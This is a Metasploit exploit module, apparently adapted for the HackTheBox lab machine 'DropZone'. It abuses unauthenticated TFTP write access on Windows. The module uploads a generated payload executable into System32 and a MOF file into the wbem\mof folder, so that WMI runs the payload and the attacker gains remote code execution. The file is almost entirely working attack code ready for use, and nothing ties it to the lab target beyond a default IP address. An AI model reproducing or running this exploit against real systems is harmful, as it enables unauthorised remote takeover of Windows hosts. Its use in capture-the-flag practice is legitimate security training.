##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Rex::Proto::TFTP
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HackTheBox - DropZone Exploit - (RCE)",
      'Description'    => %q{
        Este modulo explota una vulnerabilidad de escritura a traves de TFTP  
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'modpr0be',  #Initial discovery, PoC (Tom Gregory)
          'sinn3r',     #Metasploit
		  'PlainText'	#Modulo para DropZone
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['DropZone HackTheBox', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 8 2018",
      'DefaultTarget'  => 0))

    register_options([
	    OptAddress.new('RHOST', [true, "La direccion IP de DropZone", "10.10.10.90"]),
	    OptPort.new('RPORT', [true, "El puerto TFTP de DropZone", 69])
    ])
  end

  def upload(filename, data)
    tftp_client = Rex::Proto::TFTP::Client.new(
      "LocalHost"  => "0.0.0.0",
      "LocalPort"  => 1025 + rand(0xffff-1025),
      "PeerHost"   => datastore['RHOST'],
      "PeerPort"   => datastore['RPORT'],
      "LocalFile"  => "DATA:#{data}",
      "RemoteFile" => filename,
      "Mode"       => "octet",
      "Context"    => {'Msf' => self.framework, "MsfExploit" => self },
      "Action"     => :upload
    )

    ret = tftp_client.send_write_request { |msg| print_status(msg) }
    while not tftp_client.complete
      select(nil, nil, nil, 1)
    end
      tftp_client.stop
  end

  def exploit
    peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"

    # Setup the necessary files to do the wbemexec trick
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
    exe      = generate_payload_exe
    mof_name = rand_text_alpha(rand(10)+5) + '.mof'
    mof      = generate_mof(mof_name, exe_name)

    # Upload the malicious executable to C:\Windows\System32\
    print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
    upload("WINDOWS\\system32\\#{exe_name}", exe)

    # Let the TFTP server idle a bit before sending another file
    select(nil, nil, nil, 1)

    # Upload the mof file
    print_status("#{peer} - Uploading .mof...")
    upload("WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
  end
end
